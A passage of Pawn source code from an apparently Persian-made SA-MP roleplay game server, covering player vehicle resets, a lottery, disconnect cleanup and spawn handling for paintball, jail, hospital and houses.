    PlayerInfo[playerid][cMod3] = 0;
    PlayerInfo[playerid][cMod4] = 0;
    PlayerInfo[playerid][cMod5] = 0;
    PlayerInfo[playerid][cMod6] = 0;
    PlayerInfo[playerid][cMod7] = 0;
    PlayerInfo[playerid][cMod8] = 0;
    PlayerInfo[playerid][cMod9] = 0;
    PlayerInfo[playerid][cMod10] = 0;
    PlayerInfo[playerid][cMod11] = 0;
    PlayerInfo[playerid][cMod12] = 0;
    PlayerInfo[playerid][cMod13] = 0;
    PlayerInfo[playerid][cMod14] = 0;
    PlayerInfo[playerid][cMod15] = 0;
    PlayerInfo[playerid][cMod16] = 0;
    PlayerInfo[playerid][cMod17] = 0;
    PlayerInfo[playerid][cPaintJob] = 3;
    PlayerInfo[playerid][cKilo] = 0.0;
    PlayerInfo[playerid][cPanel] = 0;
    PINFO[playerid][cDoors] = 0;
    PINFO[playerid][cLights] = 0;
    PINFO[playerid][cTires] = 0;
    PlayerInfo[playerid][cLocationx_2] = 0.0;
    PlayerInfo[playerid][cLocationy_2] = 0.0;
    PlayerInfo[playerid][cLocationz_2] = 0.0;
    PlayerInfo[playerid][cAngle_2] = 0.0;
    PlayerInfo[playerid][cColor1_2] = 9999;
    PlayerInfo[playerid][cColor2_2] = 9999;
    PlayerInfo[playerid][cModel_2] = 0;
    PlayerInfo[playerid][cPrice_2] = 0;
    format(string, sizeof(string), "SF");
    strmid(PlayerInfo[playerid][cPlate], string, 0, strlen(string), 255);
    PlayerInfo[playerid][cLock_2] = 0;
    PlayerInfo[playerid][cDestroyed_2] = 0;
    PINFO[playerid][cFixed_2] = 0;
    PINFO[playerid][cInsurance_2] = 0;
    PlayerInfo[playerid][cFuel_2] = 0;
    PlayerInfo[playerid][cHealth_2] = 0.0;
    PlayerInfo[playerid][cMod1_2] = 0;
    PlayerInfo[playerid][cMod3_2] = 0;
    PlayerInfo[playerid][cMod4_2] = 0;
    PlayerInfo[playerid][cMod5_2] = 0;
    PlayerInfo[playerid][cMod6_2] = 0;
    PlayerInfo[playerid][cMod7_2] = 0;
    PlayerInfo[playerid][cMod8_2] = 0;
    PlayerInfo[playerid][cMod9_2] = 0;
    PlayerInfo[playerid][cMod10_2] = 0;
    PlayerInfo[playerid][cMod11_2] = 0;
    PlayerInfo[playerid][cMod12_2] = 0;
    PlayerInfo[playerid][cMod13_2] = 0;
    PlayerInfo[playerid][cMod14_2] = 0;
    PlayerInfo[playerid][cMod15_2] = 0;
    PlayerInfo[playerid][cMod16_2] = 0;
    PlayerInfo[playerid][cMod17_2] = 0;
    PlayerInfo[playerid][cPaintJob_2] = 3;
    PlayerInfo[playerid][cKilo_2] = 0.0;
    PlayerInfo[playerid][cPanel_2] = 0;
    PINFO[playerid][cDoors_2] = 0;
    PINFO[playerid][cLights_2] = 0;
    PINFO[playerid][cTires_2] = 0;
    ClearMarriage(playerid);
    SetPlayerColor(playerid,COLOR_GRAD2);
	SetPlayerCameraPos(playerid,1414.2831, -2336.0010, 74.3994);
	SetPlayerCameraLookAt(playerid,1574.2235,-2259.6084,13.3828);
    return 1;

}
/*----------------------------------------------------------------------------*/
public ClearMarriage(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        new string[MAX_PLAYER_NAME];
        format(string, sizeof(string), "No-one");
        strmid(PlayerInfo[playerid][pMarriedTo], string, 0, strlen(string), 255);
        SaveKonStr(playerid, "pMarriedTo", PINFO[playerid][pMarriedTo]);
    }
    return 1;
}
/*----------------------------------------------------------------------------*/
public Lotto(number)
{
    new JackpotFallen = 0;
    new string[256];
    new winner[MAX_PLAYER_NAME];
    format(string, sizeof(string), "Ghore Keshi: Barandeye Emrooz : %d.", number);
    OOCOff(COLOR_RED, string);
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pLottoNr] > 0)
            {
                if(PlayerInfo[i][pLottoNr] == number)
                {
                    JackpotFallen = 1;
                    GetPlayerName(i, winner, sizeof(winner));
                    format(string, sizeof(string), "Ghore Keshi: %s Barandeye $%s shod.", winner, FormatNumber(Jackpot));
                    OOCOff(COLOR_DBLUE, string);
                    format(string, sizeof(string), "Shoma Barandeye $%s Shodid.", FormatNumber(Jackpot));
                    SendClientMessage(i, COLOR_YELLOW, string);
                    GivePlayerPool(i, Jackpot);
                }
                else
                {
                    SendClientMessage(i, COLOR_RED, "SHoma Barande Nashodi.");
                }
            }
        }
    }
    if(JackpotFallen)
    {
        new rand = random(1250); rand += 180;
        Jackpot = rand;
        SaveStuff();
        format(string, sizeof(string), "Ghore Keshi: Ghore Keshi dobare Shoroo SHod $%s.", FormatNumber(Jackpot));
        OOCOff(COLOR_WHITE, string);
    }
    else
    {
        new rand = random(150); rand += 60;
        Jackpot += rand;
        SaveStuff();
        format(string, sizeof(string), "Lottery News: The Jackpot has been raised to $%s.", FormatNumber(Jackpot));
        OOCOff(COLOR_DBLUE, string);
    }
    return 1;
}
/*----------------------------------------------------------------------------*/
public settime()
{
	new string[256],year,month,day,hours,minutes,seconds;
	getdate(year, month, day), gettime(hours, minutes, seconds);
	format(string, sizeof string, "%02d/%02d/%02d",year,month,day);
	TextDrawSetString(Date, string);
	format(string, sizeof string, "%02d:%02d",hours,minutes);
	TextDrawSetString(Time, string);
}
/*----------------------------------------------------------------------------*/
public RandomMessage()
{
        TextDrawSetString(ShadowsRandom, RandomMessages[random(sizeof(RandomMessages))]);
        return 1;
}
/*----------------------------------------------------------------------------*/
public OnGameModeExit()
{
    return 1;
}
/*----------------------------------------------------------------------------*/
public OnPlayerDisconnect(playerid, reason)
{
    IsAtTelePhoneSabet[playerid] = false;
    OnFirstSpawn[playerid] = false;
    TextDrawDestroy(playerid,pmodel[playerid]);
    for(new i = 0;i <= 6;i++) TextDrawDestroy(playerid,jtxd[playerid][i]);
    TextDrawHideForPlayer(playerid, pmodel[playerid]);
	for(new i = 0;i < MAX_VEHICLES;i++) {
	if(VehOwned[i] == 2 && VehOwner[i] == playerid) {
	VehOwner[i] = 9999;
	VehOwned[i] = 2;
	}
	}


	if(OnMashinKharidan[playerid] == 1) {
	DestroyVehicle(vhid[playerid]);
	CancelSelectTextDraw(playerid);
	SetCameraBehindPlayer(playerid);
	OnMashinKharidan[playerid] = 0;
	}
	TextDrawHideForPlayer(playerid,TD_pConnectUp[playerid]);
    residam[playerid] = 0;
	PlayerInfo[playerid][pOnline] = 0;
    SaveKonVal(playerid, "pOnline", 0);
    Cheating2Nex[playerid] = 0;
    if(isRelogging[playerid])
    {
        new string[30];
        isRelogging[playerid] = false;
        format(string, sizeof(string), "unbanip %s", relogPlayerIP[playerid]);
        SendRconCommand(string);
    }


	strdel(PlayerRamz[playerid],0,4);
	PlayerRamzing[playerid] =0;
	InModShop[playerid] = 0;
	AccountLock[playerid] =0;
	Neon[playerid] = 0;
	pNoFind[playerid] =0;
	CanUseDrug[playerid] =0;
	TextDrawSize[playerid] =0;
	IsPlayerSpawnedForMessage[playerid] =0;
    SaveKonFloat(playerid, "pPayCheck", PINFO[playerid][pPayCheck]);
    SaveKonVal(playerid, "pCarTime", PINFO[playerid][pCarTime]);
    CountDeaths[ playerid ] = 0, StartDeathTick[ playerid ] = 0;
    PlayDeathingCamera[playerid] = false;
    HelpmeText[playerid][0] = '\0';
    ReportText[playerid][0] = '\0';
    Reported[playerid] = INVALID_PLAYER_ID;
    Helpme[playerid] = INVALID_PLAYER_ID;
    if(playerid == LastPID-1)
    {
        for(new i = playerid-1;i == 0;i--)
        {
            if(IsPlayerConnected(i))
            {
                LastPID = i+1;
            }
        }
    }
    if(Neon[playerid] == 1)
    {
        for(new i = 0; i < 24; i++)
        {
            DestroyObject(Neons[playerid][i]);
            Neon[playerid] = 0;
        }
    }
    if(RentedVehicle[playerid] != INVALID_VEHICLE_ID)
    {
        SetVehicleToRespawn(RentedVehicle[playerid]);
    }
    OnRentMashinMessage[playerid] = false;
    for(new i;i<LastPID;i++)
    {
        if(Helpme[i] == playerid && IsPlayerConnected(i))
        {
            new alis[120];
            format(alis, 120, "Helper Shoma (%s) Az Bazi Biroon Raft / Montazere Helper Digar Bashid.",PINFO[playerid][pName]);
            SCM(i,COLOR_ALI,alis);
            Helpme[i] = INVALID_PLAYER_ID-1;
        }
        if(Helpme[playerid] == i && IsPlayerConnected(i))
        {
            new alis[120];
            format(alis, 120, "That player %s that request for help left the game",PINFO[playerid][pName]);
            SCM(i,COLOR_ALI,alis);
        }
        if(Reported[i] == playerid && IsPlayerConnected(i))
        {
            new alis[120];
            format(alis, 120, "Admin SHma (%s) Az Bazi Biroon Raft / Montazere Admin Digar Bashid.",PINFO[playerid][pName]);
            SCM(i,COLOR_ALI,alis);
            Reported[i] = INVALID_PLAYER_ID-1;
        }
        if(Reported[playerid] == i && IsPlayerConnected(i))
        {
            new alis[120];
            format(alis, 120, "That player %s that request for report left the game",PINFO[playerid][pName]);
            SCM(i,COLOR_ALI,alis);
        }
    }
    if(gPlayerLogged[playerid] == 1)
    {
        if(PINFO[playerid][pHeadValue] >= 1)
        {
            if(AgentHiterID[playerid] != INVALID_PLAYER_ID)
            {
                new string[256];
                format(string,256,"Your contract(%s) left the game.",PINFO[playerid][pName]);
                SCM(AgentHiterID[playerid],COLOR_Good,string);
                AgentContractID[AgentHiterID[playerid]] = ReturnAgentID();
                AgentContractIDUsed[ReturnAgentID()] = true;
                AgentHitID[AgentHiterID[playerid]] = INVALID_PLAYER_ID;
                AgentHiterID[playerid] = INVALID_PLAYER_ID;
            }
        }
        if(AgentHitID[playerid] != INVALID_PLAYER_ID)
        {
            AgentHiterID[AgentHitID[playerid]] = INVALID_PLAYER_ID;
            ContractID[AgentHitID[playerid]] = ReturnContractID();
            ContractIDUsed[AgentHitID[playerid]] = true;
            ContractsCount ++;
        }
    }
    if(OnSellCar[playerid] != INVALID_PLAYER_ID)
    {
        OwnableCarOffer[OnSellCar[playerid]] = INVALID_PLAYER_ID;
        OwnableCarID[OnSellCar[playerid]] = 0;
        OwnableCarPrice[OnSellCar[playerid]] = 0;
        OwnableCarMethod[OnSellCar[playerid]] = 0;
        SCM(OnSellCar[playerid],COLOR_ALI,"Your offer rejected(car offerer left game).");
    }
    if(OwnableCarOffer[playerid] != INVALID_PLAYER_ID)
    {
        OnSellCar[OwnableCarOffer[playerid]] = INVALID_PLAYER_ID;
        SCM(OwnableCarOffer[playerid],COLOR_ALI,"Offer rejected(who you offer him/her left game).");
    }
    TeadadPlayers --;
    if(gPlayerLogged[playerid] == 1)
    {
        if(OnRob[playerid] == true && RobLeader[playerid] == false)
        {
            new strrali[256];format(strrali,256,"Mission ~r~Failed~n~~r~%s left the game",PINFO[playerid][pName]);
            GameTextForPlayer(RobDriver[playerid],strrali,9000,0);
            if(CP[RobDriver[playerid]] >= 2002001 && CP[RobDriver[playerid]] <= 2002009){DisablePlayerCheckpoint(RobDriver[playerid]);OnCheckpoint[RobDriver[playerid]] = 0;CP[RobDriver[playerid]] = 0;}
            OnRob[RobDriver[playerid]] = false;
            RobLeader[RobDriver[playerid]] = false;
            for(new i;i<RobMemberCount[RobDriver[playerid]];i++)
            {
                if(RobMember[RobDriver[playerid]][i] != playerid)
                {
                    GameTextForPlayer(RobMember[RobDriver[playerid]][i],strrali,9000,0);
                    OnRob[RobMember[RobDriver[playerid]][i]] = false;
                    RobDriver[RobMember[RobDriver[playerid]][i]] = INVALID_PLAYER_ID;
                }
            }
            RobMemberCount[RobDriver[playerid]] = 0;
            for(new i;i<100;i++)
            {
                RobMember[RobDriver[playerid]][i] = INVALID_PLAYER_ID;
            }
        }
        if(OnRob[playerid] == true && RobLeader[playerid] == true)
        {
            new strrali[256];format(strrali,256,"Mission ~r~Failed~n~~r~%s left the game",PINFO[playerid][pName]);
            for(new i;i<RobMemberCount[playerid];i++)
            {
                GameTextForPlayer(RobMember[playerid][i],strrali,9000,0);
                OnRob[RobMember[playerid][i]] = false;
                RobDriver[RobMember[playerid][i]] = INVALID_PLAYER_ID;
            }
        }
        if(WantedKamKonTimerValid[playerid] == true) KillTimer(WantedKamKonTimer[playerid]);
        WantedKamKonTimerValid[playerid] = false;
        if(EventOrg == playerid)
        {
                new string[256];
                if(reason == 0) format(string,256,"%s crashed from the game and their event got overed.",PINFO[playerid][pName]);
                if(reason == 1) format(string,256,"%s quited from the game and their event got overed.",PINFO[playerid][pName]);
                if(reason == 2) format(string,256,"%s Kicked or Banned from the game and their event got overed.",PINFO[playerid][pName]);
                AdminWarn(string);
                EventOrg = INVALID_PLAYER_ID;
                EventHave = false;
                EventIDUsed[EventID[playerid]] = false;
                EventIDOrg[EventID[playerid]] = INVALID_PLAYER_ID;
                EventSay(COLOR_YELLOW,"Event over");
                EventReward[playerid] = 0;
                strmid(EventTime[playerid],"00:00",0,strlen("00:00"),20);
                strmid(EventLocation[playerid],"HichJa",0,strlen("HichJa"),60);
                strmid(EventDesc[playerid],"KooFT",0,strlen("KooFT"),80);
                strmid(EventTitle[playerid],"Hichi",0,strlen("Hichi"),60);
                EventID[playerid] = 9999;
        }
        if(EventID[playerid] != 9999)
        {
                EventIDUsed[EventID[playerid]] = false;
                EventIDOrg[EventID[playerid]] = INVALID_PLAYER_ID;
                EventReward[playerid] = 0;
                strmid(EventTime[playerid],"00:00",0,strlen("00:00"),20);
                strmid(EventLocation[playerid],"HichJa",0,strlen("HichJa"),60);
                strmid(EventDesc[playerid],"KooFT",0,strlen("KooFT"),80);
                strmid(EventTitle[playerid],"Hichi",0,strlen("Hichi"),60);
        }
    }
    if(adtimerplayer[playerid] > 0)
    {
        adtimer -= adtimerplayer[playerid];
        for(new i = 0;i < LastPID;i++)
        {
            if(adtimerplayer[i] > 0)
            {
                adtimerplayer[i] -= adtimerplayer[playerid];
            }
        }
        adtimerplayer[playerid] = 0;
    }
    TimerAnnouncer[playerid] = 0;
    if(SpeedTimerUsed[playerid] == true)
    {
        SpeedTimerUsed[playerid] = false;
        KillTimer(SpeedTimer[playerid]);
    }
    KillTimer(PaymecTime[playerid]);
    KillTimer(HealthTimer[playerid]);
    if(AntiKhoonHack[playerid] && PINFO[playerid][pTut] == 1 && gPlayerLogged[playerid] == 1)
    {
        KillTimer(AntiKhoonHack[playerid]);
    }
    if(KickLoginUsed[playerid] == true)
    {
        KillTimer(KickLogin[playerid]);
        KickLoginUsed[playerid] = false;
    }
    if(IHaveKey[playerid] != 0)
    {
        KeyDade[MashinOwner[IHaveKey[playerid]]] = 9999;
    }
    if(IHaveKey_2[playerid] != 0)
    {
        KeyDade_2[MashinOwner_2[IHaveKey_2[playerid]]] = 9999;
    }
    if(PlayerInfo[playerid][pCar_2] != 0)
    {
        if(KeyDade_2[playerid] != 9999)
        {
            IHaveKey_2[KeyDade_2[playerid]] = 0;
        }
        new vehicleid = PINFO[playerid][pCar_2];
        new panelss,doorss,lightse,tiress;
        GetVehicleDamageStatus(vehicleid,panelss,doorss,lightse,tiress);
        PlayerInfo[playerid][cPanel_2] = panelss;
        SaveKonVal(playerid, "cPanel_2", panelss);
        PlayerInfo[playerid][cDoors_2] = doorss;
        SaveKonVal(playerid, "cDoors_2", doorss);
        PlayerInfo[playerid][cLights_2] = lightse;
        SaveKonVal(playerid, "cLights_2", lightse);
        PlayerInfo[playerid][cTires_2] = tiress;
        SaveKonVal(playerid, "cTires_2", tiress);
        new Float:health;
        GetVehicleHealth(vehicleid,health);
        PlayerInfo[playerid][cHealth_2] = health;
        SaveKonFloat(playerid, "cHealth_2", health);
        PlayerInfo[playerid][cFuel_2] = Benzin[vehicleid];
        SaveKonVal(playerid, "cFuel_2", Benzin[vehicleid]);
        MashinOwner_2[vehicleid] = 9999;
        GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
        SetVehicleParamsEx(vehicleid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
        EngineSTATE[vehicleid] = 0;
        LightsSTATE[vehicleid] = 0;
        bonnetSTATE[vehicleid] = 0;
        bootSTATE[vehicleid] = 0;
        DestroyVehicle(vehicleid, true);
        OwnedMashin_2[vehicleid] = 0;
    }
    if(PlayerInfo[playerid][pCar] != 0)
    {
        if(KeyDade[playerid] != 9999)
        {
            IHaveKey[KeyDade[playerid]] = 0;
        }
        new vehicleid = PINFO[playerid][pCar];
        new panelss,doorss,lightse,tiress;
        GetVehicleDamageStatus(vehicleid,panelss,doorss,lightse,tiress);
        PlayerInfo[playerid][cPanel] = panelss;
        SaveKonVal(playerid, "cPanel", panelss);
        PlayerInfo[playerid][cDoors] = doorss;
        SaveKonVal(playerid, "cDoors", doorss);
        PlayerInfo[playerid][cLights] = lightse;
        SaveKonVal(playerid, "cLights", lightse);
        PlayerInfo[playerid][cTires] = tiress;
        SaveKonVal(playerid, "cTires", tiress);
        new Float:health;
        GetVehicleHealth(vehicleid,health);
        PlayerInfo[playerid][cHealth] = health;
        SaveKonFloat(playerid, "cHealth", health);
        PlayerInfo[playerid][cFuel] = Benzin[PlayerInfo[playerid][pCar]];
        SaveKonVal(playerid, "cFuel", Benzin[PlayerInfo[playerid][pCar]]);
        GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
        SetVehicleParamsEx(vehicleid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
        EngineSTATE[vehicleid] = 0;
        LightsSTATE[vehicleid] = 0;
        bonnetSTATE[vehicleid] = 0;
        bootSTATE[vehicleid] = 0;
        DestroyVehicle(PlayerInfo[playerid][pCar], true);
        OwnedMashin[PlayerInfo[playerid][pCar]] = 0;
        MashinOwner[PlayerInfo[playerid][pCar]] = 9999;
    }
    if(Mobile[playerid] != 9999 && Mobile[Mobile[playerid]] != 9999)
    {
                new caller = Mobile[playerid];
                if(IsPlayerConnected(caller))
                {
                    SendClientMessage(caller,  COLOR_PURPLE, "The line just went dead ....(your caller left the game)");
                    SetPlayerSpecialAction(caller, SPECIAL_ACTION_STOPUSECELLPHONE);
                    RemovePlayerAttachedObject(caller, 0);
                    CellTime[playerid] = 90;
                    CellTime[caller] = 90;
                    Mobile[playerid] = 9999;
                    Mobile[caller] = 9999;
                    TimerRingTone[playerid] = 0;
                    TimerRingTone[caller] = 0;
                    PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad save she
                }
    }
    if(Mobile[playerid] != 9999 && CallWaiting[playerid] == 9999)
    {
                new caller = Mobile[playerid];
                if(IsPlayerConnected(caller))
                {
                    SendClientMessage(caller,  COLOR_PURPLE, "The line just went dead ....(your caller left the game)");
                    RemovePlayerAttachedObject(caller, 0);
                    CellTime[playerid] = 90;
                    CellTime[caller] = 90;
                    Mobile[playerid] = 9999;
                    Mobile[caller] = 9999;
                    TimerRingTone[playerid] = 0;
                    TimerRingTone[caller] = 0;
                    PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad save she
                    CallWaiting[caller] = 9999;
                }
    }
    if(Mobile[playerid] == 9999 && CallWaiting[playerid] != 9999)
    {
                new caller = CallWaiting[playerid];
                if(IsPlayerConnected(caller))
                {
                    SendClientMessage(caller,  COLOR_PURPLE, "The line just went dead ....(your caller target left the game)");
                    RemovePlayerAttachedObject(caller, 0);
                    SetPlayerSpecialAction(caller, SPECIAL_ACTION_STOPUSECELLPHONE);
                    CellTime[playerid] = 90;
                    CellTime[caller] = 90;
                    Mobile[playerid] = 9999;
                    Mobile[caller] = 9999;
                    TimerRingTone[playerid] = 0;
                    TimerRingTone[caller] = 0;
                    PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad save she
                    PlayerInfo[caller][pSpeaker] = 0;//Nemikhad save she
                    CallWaiting[playerid] = 9999;
                }
    }


    HealthAllowedForPlayer[playerid] = 0;
    AFK[playerid]=0;
 //   new stringl[85];
 //   format(stringl, sizeof(stringl), "[Left] %s (%i) has left the server [%s]", PINFO[playerid][pName], playerid, PINFO[playerid][pIp]);
    new sendername[MAX_PLAYER_NAME];
    new string[64];
    GetPlayerName(playerid, sendername, sizeof(sendername));
    switch(reason)
    {
		case 0: format(string, sizeof string, "%s exited the Game (crashed).", sendername);
        case 1: format(string, sizeof string, "%s exited the Game (/q).", sendername);
        case 2: format(string, sizeof string, "%s exited the Game (kicked/banned).", sendername);
    }
    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
    SendAdminMessage(0xD0000FFF, string);
    //SaveAccount(playerid);
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(IAcceptTaxi[i] == 1)
            {
                if(TaxiAccepted[i] == playerid)
                {
                    IAcceptTaxi[i] = 0;
                    GameTextForPlayer(i, "~w~Taxi Caller~n~~r~Left the game", 5000, 1);
                    TaxiCallTime[i] = 0;
                    DisablePlayerCheckpoint(i);
                    OnCheckpoint[i] = 0;
                }
            }
        }
    }
    if(TransportCost[playerid] > 0 && TransportDriver[playerid] < INVALID_PLAYER_ID)
    {
        if(IsPlayerConnected(TransportDriver[playerid]))
        {
            TransportMoney[TransportDriver[playerid]] += TransportCost[playerid];
            TransportTime[TransportDriver[playerid]] = 0;
            TransportCost[TransportDriver[playerid]] = 0;
            format(string, sizeof(string), "~w~Passenger left~n~~g~Earned $%s",FormatNumber(TransportCost[playerid]));
            GameTextForPlayer(TransportDriver[playerid], string, 5000, 1);
        }
    }
    if(OnPaintBall[playerid] != 0)
    {
        PaintBallPlayers --;
    }
    if(OnKarting[playerid] != 0)
    {
        KartingPlayers --;
    }
    //----------------------------------------------
    if(TransportDuty[playerid] == 1)
    {
        TaxiDrivers -= 1;
    }
/*    else if(TransportDuty[playerid] == 2)
    {
        BusDrivers -= 1;
    }*/
    else if(PlayerInfo[playerid][pJob] == 7)
    {
        if(JobDuty[playerid] == 1) { Mechanics -= 1; }
    }
    ResetPlayerTofang(playerid);
    gPlayerLogged[playerid] = 0;
	PlayerInfo[playerid][pOnline] = 0;
    SaveKonVal(playerid, "pOnline", 0);
    return 1;
}
/*----------------------------------------------------------------------------*/
public SetPlayerSpawn(playerid)
{
	if(IsPlayerConnected(playerid))
    {
        
		 //for(new i; i<43; i++) { PlayerTextDrawHide(playerid, IntroTD[i][playerid]); }
        if(PlayerInfo[playerid][pReg] == 1 && IsLogedIn[playerid] == false && IsPlayerSpawnedForMessage[playerid] == 0) FirstSpawn2(playerid);
		TextDrawHideForPlayer(playerid, TD_LoadingAccount[0]);
		TextDrawHideForPlayer(playerid, TD_LoadingAccount[1]);
		TextDrawHideForPlayer(playerid, TD_LoadingAccount[2]);
        new rand;
        new house = PlayerInfo[playerid][pPhousekey];
        if(house != 9999 && SpawnChange[playerid]){TooHouse[playerid] = house;}
        if(AFK[playerid] == 1 && (PINFO[playerid][pPhousekey] == 9999 || TooHouse[playerid] == 9999)) { AFK[playerid] = 0; }
        if(AFK[playerid] == 1)
        {
            AFK[playerid] = 1;
            TogglePlayerControllable(playerid, 0);
            SetPlayerColor(playerid,COLOR_AFK);
            LoopingAnim(playerid,"CRACK","crckidle2",4.0,0,0,0,1,0);
        }
        if(OnPaintBall[playerid] != 0)
        {
            ResetPlayerTofang(playerid);
            SetPlayerZereh(playerid, 0);
            SetPlayerVirtualWorld(playerid,10);
	if(pbdg > pbsl && pbdg > pbsg && pbdg > pbss && pbdg > pbcs && pbdg > pbmp && pbdg > pbsr && pbdg > pbak && pbdg > pbm4 && pbdg > pbcr)
	{GivePlayerTofang(playerid, 24, 2000);}

	else if(pbsl > pbdg && pbsl > pbsg && pbsl > pbss && pbsl > pbcs && pbsl > pbmp && pbsl > pbsr && pbsl > pbak && pbsl > pbm4 && pbsl > pbcr)
	{GivePlayerTofang(playerid, 23, 2000);}

	else if(pbsg > pbdg && pbsg > pbsl && pbsg > pbss && pbsg > pbcs && pbsg > pbmp && pbsg > pbsr && pbsg > pbak && pbsg > pbm4 && pbsg > pbcr)
	{GivePlayerTofang(playerid, 25, 2000);}

	else if(pbss > pbdg && pbss > pbsl && pbss > pbsg && pbss > pbcs && pbss > pbmp && pbss > pbsr && pbss > pbak && pbss > pbm4 && pbss > pbcr)
	{GivePlayerTofang(playerid, 26, 2000);}

	else if(pbcs > pbdg && pbcs > pbsl && pbcs > pbss && pbcs > pbsg && pbcs > pbmp && pbcs > pbsr && pbcs > pbak && pbcs > pbm4 && pbcs > pbcr)
	{GivePlayerTofang(playerid, 27, 2000);}

	else if(pbmp > pbdg && pbmp > pbsl && pbmp > pbss && pbmp > pbcs && pbmp > pbsg && pbmp > pbsr && pbmp > pbak && pbmp > pbm4 && pbmp > pbcr)
	{GivePlayerTofang(playerid, 29, 2000);}

	else if(pbsr > pbdg && pbsr > pbsl && pbsr > pbss && pbsr > pbcs && pbsr > pbmp && pbsr > pbsg && pbsr > pbak && pbsr > pbm4 && pbsr > pbcr)
	{GivePlayerTofang(playerid, 34, 2000);}

	else if(pbak > pbdg && pbak > pbsl && pbak > pbss && pbak > pbcs && pbak > pbmp && pbak > pbsr && pbak > pbsg && pbak > pbm4 && pbak > pbcr)
	{GivePlayerTofang(playerid, 30, 2000);}

	else if(pbm4 > pbdg && pbm4 > pbsl && pbm4 > pbss && pbm4 > pbcs && pbm4 > pbmp && pbm4 > pbsr && pbm4 > pbak && pbm4 > pbsg && pbm4 > pbcr)
	{GivePlayerTofang(playerid, 31, 2000);}

	else if(pbcr > pbdg && pbcr > pbsl && pbcr > pbss && pbcr > pbcs && pbcr > pbmp && pbcr > pbsr && pbcr > pbak && pbcr > pbm4 && pbcr > pbsg)
	{GivePlayerTofang(playerid, 33, 2000);}

else {GivePlayerTofang(playerid, 31, 2000);GivePlayerTofang(playerid, 27, 2000);SendClientMessage(playerid, COLOR_BLUE,"Result vote : ==.");}
		    rand = random(sizeof(PaintballSpawns));
            SetPlayerPosEx(playerid, PaintballSpawns[rand][0], PaintballSpawns[rand][1], PaintballSpawns[rand][2]);
            Mahal[playerid] = 1;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            PaintBallPlayers ++;
            if(PaintBallPlayers >= 3 && PTime >= 30)
            {
                for(new i;i<LastPID;i++)
                {
                    if(IsPlayerConnected(i))
                    {
                        if(OnPaintBall[i] == 1)
                        {
                            SCM(i,COLOR_ALI,"A player has joined to the match(3/x) now paintball timer set to 30 seconds.");
                            PTime = 30;
                        }
                    }
                }
            }
            if(PaintballStarted == 0 && PaintBallStarting == 1)
            {
                new lol = PTime,minN,sec;
                for(new i;i<7;i++)
                {
                    if(lol >= 60) {lol -= 60;minN++;}
                    if(lol <= 59) {sec = lol; lol = 0; break;}
                }
                new sttr[256];format(sttr,256,"You need to wait %d Minutes and %d seconds to other players join this match.",minN,sec);
                SCM(playerid,COLOR_ALI,sttr);
                TogglePlayerControllable(playerid,0);
            }
            if(PaintballStarted == 0 && PaintBallStarting == 0)
            {
                SCM(playerid,COLOR_ALI,"You need to wait 5 minutes to other players join this match.");
                PTime = 300;
                TogglePlayerControllable(playerid,0);
                PaintBallStarting = 1;
            }
            return 1;
        }
        if(OnStopSpecing[playerid] == true)
        {
            SetPlayerVirtualWorld(playerid,TelportEtela2[playerid][0]);
            SetPlayerInterior(playerid,TelportEtela2[playerid][1]);
            Mahal[playerid] = TelportEtela2[playerid][2];
            TooBiz[playerid] = TelportEtela2[playerid][4];
            TooHouse[playerid] = TelportEtela2[playerid][3];
            SetPlayerPosEx(playerid,TelePos2[playerid][0],TelePos2[playerid][1],TelePos2[playerid][2]);
            OnStopSpecing[playerid] = false;
            return 1;
        }
        if(PlayerInfo[playerid][pJailTime] >= 1)
        {
            new ali = random(sizeof(InJail));
            SetPlayerWantedLevel(playerid, 0);
            SetPlayerPosEx(playerid, InJail[ali][0] , InJail[ali][1] , InJail[ali][2]);
            Mahal[playerid] = 2;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            SetPlayerSkin(playerid,62);
            SetPlayerVirtualWorld(playerid,10);
            TextDrawShowForPlayer(playerid,JailTextDraw[playerid]);
            SendClientMessage(playerid, COLOR_LIGHTRED, "Incomplete Jail Sentence, back to jail.");
            SetPlayerInterior(playerid, 1);
            return 1;
        }
        if(MedicBill[playerid] == 1 && PlayerInfo[playerid][pJailTime] <= 0 && OnPaintBall[playerid] == 0)
        {
            GivePlayerPool(playerid, -SBizzInfo[15][sbEntranceCost]);
            new string[256];
            format(string, 256, "{FFFFFF}DOC: Your Medical Bill comes to {57e547}$%i, {FFFFFF}Have a nice day.",SBizzInfo[15][sbEntranceCost]);
            SendClientMessage(playerid, TEAM_CYAN_COLOR, string);
            MedicBill[playerid] = 0;
            MedicTime[playerid] = 0;
            NeedMedicTime[playerid] = 0;
            PlayerInfo[playerid][pDeaths] += 1;
            SaveKonVal(playerid, "pDeaths", PINFO[playerid][pDeaths]);
            SetPlayerKhoon(true, playerid, 100);
            SBizzInfo[15][sbTill] += SBizzInfo[15][sbEntranceCost];
        }
        if(house != 9999)
        {
            if(SpawnChange[playerid]) //If 1, then you get to your house, else spawn somewhere else
            {
                SetPlayerToTeamColor(playerid);
                SetPlayerInterior(playerid,HouseInfo[house][hInt]);
                SetPlayerVirtualWorld(playerid,HouseInfo[house][hWorld]);
                SetPlayerPosEx(playerid, HouseInfo[house][hEntrancex], HouseInfo[house][hEntrancey],HouseInfo[house][hEntrancez]); // Warp the player
                TooHouse[playerid] = house;
                Mahal[playerid] = 3;
                TooBiz[playerid] = 9999;
                return 1;
            }
        }
        if(house == 9999)
        {
             SetPlayerVirtualWorld(playerid, 0);
        }
        if(PlayerInfo[playerid][pLeader] == 7)//Mayor spawn
        {
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid, 3);
            SetPlayerPosEx(playerid, 356.2998,151.9914,1025.7891);
            Mahal[playerid] = 4;
